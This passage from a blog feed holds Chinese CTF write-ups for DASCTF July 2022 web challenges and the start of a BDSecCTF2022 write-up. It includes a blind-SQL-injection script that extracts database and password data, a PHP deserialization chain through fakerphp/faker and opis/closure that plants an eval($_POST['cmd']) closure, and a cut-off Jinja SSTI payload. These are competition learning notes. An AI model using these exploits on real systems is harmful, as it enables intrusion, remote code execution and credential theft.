class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/[`~!@#$%^&amp;*()_+&lt;&gt;?:&quot;&#123;&#125;,.\/;&#x27;[\]]/im</span>;</span><br><span class="line">        <span class="keyword">if</span> (reg.<span class="title function_">test</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&quot;id&quot;</span>))) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;提示：您输入的信息含有非法字符！&quot;</span>);</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;/&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">check</span>()</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><code>window.location.search.substring(1)</code>功能为获取当前页面GET方式请求<code>?后的指定参数</code></p><p>这段代码的意思大概为传递调用getQueryVariable，参数为id，该函数中获取<code>?后的请求参数</code>，用<code>&amp;</code>分割，用<code>=</code>分割，取前者，也就是变量名，并将该变量名和<code>id</code>进行对比，成功则返回<code>pair[1]</code></p><p>所以要传递变量id，但是接下来怎么利用不清楚，根据官方wp，这里用id进行sql盲注（防护不用管，是前端的防护，直接写脚本就可以）</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220802001640636.png" alt="image-20220802001640636"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://badcc3c9-4df2-4c54-a430-bc7c8b122353.node4.buuoj.cn:81/SUPPERAPI.php?&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;j=&quot;</span>+<span class="built_in">str</span>(j))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">&quot;id=1 and ascii(substr(database(),&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;,1))=&quot;</span>+<span class="built_in">str</span>(i)     <span class="comment"># # 爆库名  ctf</span></span><br><span class="line">        payload = <span class="string">&quot;id=1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;,1))=&quot;</span> + <span class="built_in">str</span>(i)   <span class="comment"># 爆表名 users</span></span><br><span class="line">        payload = <span class="string">&quot;id=1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;,1))=&quot;</span> + <span class="built_in">str</span>(i)  <span class="comment">#爆字段名 id,username,password,ip,time,USER</span></span><br><span class="line">        payload = <span class="string">&quot;id=1 and ascii(substr((select password from users where id=2),&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;,1))=&quot;</span> + <span class="built_in">str</span>(i)  <span class="comment"># 爆password</span></span><br><span class="line">        <span class="comment"># payload = &quot;id=1 and ascii(substr(database(),%d,1))=%s&quot; %(j,str(i))  # 爆库名</span></span><br><span class="line">        <span class="comment"># payload = &quot;id=1 and 2&gt;1&quot;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">        response = requests.get(url+payload)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;admin&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag=&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Newser"><a href="#Newser" class="headerlink" title="Newser"></a>Newser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_password</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$instance</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$email</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;instance = <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getEmail</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUsername</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_password = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_username = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;_username&#x27;</span>,<span class="string">&#x27;_password&#x27;</span>, <span class="string">&#x27;email&#x27;</span>,<span class="string">&#x27;instance&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;_password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;User &quot;</span>.<span class="variable language_">$this</span>-&gt;instance-&gt;_username.<span class="string">&quot; has created.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; User bWlubmllLndlaW1hbm4= has created.</span><br></pre></td></tr></table></figure><p>对cookie进行base64解码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220806191259786.png" alt="image-20220806191259786"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">12</span>:<span class="string">&quot;*_username&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;ZGVyZWswNQ==&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;*_password&quot;</span>;s:<span class="number">32</span>:<span class="string">&quot;03a83270035a975b5150954956db1a46&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Useremail&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;levi87@barton.com&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Userinstance&quot;</span>;r:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><p>cookie是User类对象的序列化</p><p>而页面回显的<code>User ZGVyZWswNQ== has created.</code>表示<code>__destruct</code>方法被调用，找反序列化利用链</p><h3 id="composer-json泄露"><a href="#composer-json泄露" class="headerlink" title="composer.json泄露"></a>composer.json泄露</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;require&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;fakerphp/faker&quot;</span>: <span class="string">&quot;^1.19&quot;</span>,</span><br><span class="line">    <span class="string">&quot;opis/closure&quot;</span>: <span class="string">&quot;^3.6&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>对于fakerphp这个依赖，他的Generator类，是主要的类，生成不存在的属性时都通过format方法，这个方法中存在call_user_func_array 的调用</p></blockquote><p>关键的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">trigger_deprecation</span>(<span class="string">&#x27;fakerphp/faker&#x27;</span>, <span class="string">&#x27;1.14&#x27;</span>, <span class="string">&#x27;Accessing property &quot;%s&quot; is deprecated, use &quot;%s()&quot; instead.&#x27;</span>, <span class="variable">$attribute</span>, <span class="variable">$attribute</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$attribute</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$arguments</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$format</span>), <span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;formatters = [];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$format</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>注意Faker\Generator类中有一个<code>__wakeup</code>方法，会将<code>formatters</code>的值替换为空，所以无论我们刚开始对formatters赋值的是什么，都会在<code>__wakeup</code>这里将其替换为空数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;formatters = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>官方wp中，这里用的是<code>php引用</code>来绕过，比较关键的是<code>该引用语句执行在 Generator类的__wakeup 后</code></p><p>因为不是很理解，所以本地调试一下，设置了formatters的两种情况</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807001238313.png" alt="image-20220807001238313"></p><h3 id="php引用"><a href="#php引用" class="headerlink" title="php引用"></a>php引用</h3><p>当其为地址时，在<code>Faker\Generator</code>的wakeup执行前，这个formatters为null，wakeup执行后，其变为空数组</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807001458924.png" alt="image-20220807001458924"></p><p>而在User类的wakeup执行后，这个formatters变为了<code>[&quot;_username&quot;=&gt;&quot;phpinfo&quot;]</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807001702781.png" alt="image-20220807001702781"></p><p>这是一个很有趣的现象，这就导致了wakeup方法的防护是无用的，可以通过php引用对对象任意赋值</p><h3 id="非php引用情况下"><a href="#非php引用情况下" class="headerlink" title="非php引用情况下"></a>非php引用情况下</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $this-&gt;formatters = &amp;$obj-&gt;password;</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;formatters = [<span class="string">&quot;_username&quot;</span>=&gt;<span class="string">&quot;phpinfo&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然<code>Faker\Generator</code>类对象在wakeup函数执行前，formatters为<code>[&quot;_username&quot;=&gt;&quot;phpinfo&quot;]</code>，但是在wakeup函数执行后，还是被修改为了空数组</p><p>并且因为没有使用php引用，所以formatters始终为空数组</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807002107803.png" alt="image-20220807002107803"></p><h3 id="exp分析"><a href="#exp分析" class="headerlink" title="exp分析"></a>exp分析</h3><p>这里分析一下调用phpinfo()的原理，<code>__get</code>方法中参数为<code>__username</code>，然后一路传参，在最后<code>call_user_func_array($this-&gt;getFormatter($format), $arguments);</code>那里，第一个参数就是<code>phpinfo</code>，而第二个参数为空，所以就是调用phpinfo</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807002958404.png" alt="image-20220807002958404"></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807003144032.png" alt="image-20220807003144032"></p><p>调用非phpinfo函数</p><blockquote><p>因为我们是通过__get 传入的，传入函数的参数不可控，phpinfo不需要参数，所以调用了。如果想要只控制函数，造成任意代码执行，可以使用反序列化闭包，这在之前也是有考过的。直接包含closure依赖中的autoload.php</p></blockquote><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807004720019.png" alt="image-20220807004720019"></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220807005604354.png" alt="image-20220807005604354"></p><p>整个过程中调试的代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">instance</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_password</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instance = <span class="keyword">new</span> <span class="title class_">Faker\Generator</span>(<span class="variable language_">$this</span>);</span><br><span class="line">            <span class="comment">// $this-&gt;_password = [&quot;_username&quot;=&gt;&quot;phpinfo&quot;];</span></span><br><span class="line">            <span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&#125;;</span><br><span class="line">            <span class="keyword">require</span> <span class="string">&#x27;vendor\opis\closure\autoload.php&#x27;</span>;     <span class="comment">//相对路径</span></span><br><span class="line">            </span><br><span class="line">            <span class="variable">$b</span>=Opis\<span class="built_in">Closure</span>\<span class="title function_ invoke__">serialize</span>(<span class="variable">$func</span>);   <span class="comment">//调用该serialize()</span></span><br><span class="line">            <span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>); </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_password = [<span class="string">&quot;_username&quot;</span>=&gt;<span class="variable">$c</span>];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;_password;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;User &quot;</span>.<span class="variable language_">$this</span>-&gt;instance-&gt;_username.<span class="string">&quot; has created.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;s:8:&quot;password&quot;&#x27;</span>,<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;s%3A14%3A%22%00User%00password%22&quot;</span>),<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>()));</span><br><span class="line">        <span class="comment">// echo &quot;运行&quot;;</span></span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str1</span>));</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str1</span>);</span><br><span class="line">       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters = &amp;<span class="variable">$obj</span>-&gt;password;</span><br><span class="line">            <span class="comment">// $this-&gt;formatters = [&quot;_username&quot;=&gt;&quot;phpinfo&quot;];</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// trigger_deprecation(&#x27;fakerphp/faker&#x27;, &#x27;1.14&#x27;, &#x27;Accessing property &quot;%s&quot; is deprecated, use &quot;%s()&quot; instead.&#x27;, $attribute, $attribute);</span></span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$attribute</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$arguments</span> = []</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$format</span>), <span class="variable">$arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters = [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$format</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后的Newser的<code>php引用</code>学到了，而<code>包含closure依赖中的autoload.php</code>那里还不清楚原理，要继续学一下。</p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> DASCTF七月赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BDSecCTF2022-Web</title>
      <link href="/2022/07/22/BDSecCTF2022-Web/"/>
      <url>/2022/07/22/BDSecCTF2022-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="BDSecCTF2022-Web"><a href="#BDSecCTF2022-Web" class="headerlink" title="BDSecCTF2022-Web"></a>BDSecCTF2022-Web</h1><p>[toc]</p><h2 id="Jungle-Templating"><a href="#Jungle-Templating" class="headerlink" title="Jungle Templating"></a>Jungle Templating</h2><p>模板注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720232832016.png" alt="image-20220720232832016"></p><p>自动化脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123;  c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="keyword">eval</span>(<span 